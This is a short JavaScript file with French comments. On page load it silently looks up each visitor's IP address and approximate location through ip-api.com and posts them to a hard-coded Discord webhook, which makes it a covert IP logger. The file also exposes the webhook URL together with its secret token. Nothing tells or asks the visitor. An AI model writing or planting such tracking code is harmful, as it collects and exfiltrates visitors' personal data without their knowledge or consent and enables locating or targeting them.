// script.js

// Fonction pour envoyer une requête POST au webhook Discord
function sendToDiscord(ip, location) {
    const webhookUrl = "https://discord.com/api/webhooks/1255583928014733323/tC8_UZYiqZVSvPObYHkG6Wsx_jfI-2COijzDJPYwB3cmO4lI-i3oKRoXIhWXw8jnCjQu";
    const message = {
        content: `Nouvel visiteur sur le site.\nAdresse IP: ${ip}\nLocalisation approximative: ${location}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok ' + response.statusText);
        }
        return response.json();
    })
    .then(data => console.log('Success:', data))
    .catch(error => console.error('Error:', error));
}

// Fonction pour obtenir l'adresse IP et la localisation approximative de l'utilisateur
function getUserIPAndLocation() {
    fetch('http://ip-api.com/json')
        .then(response => response.json())
        .then(data => {
            const ip = data.query;
            const location = `${data.city}, ${data.regionName}, ${data.country}`;
            console.log('User IP:', ip);
            console.log('Location:', location);
            sendToDiscord(ip, location);
        })
        .catch(error => console.error('Error fetching IP and location:', error));
}

// Exécuter la fonction getUserIPAndLocation lorsque le document est complètement chargé
document.addEventListener("DOMContentLoaded", function() {
    getUserIPAndLocation();
});
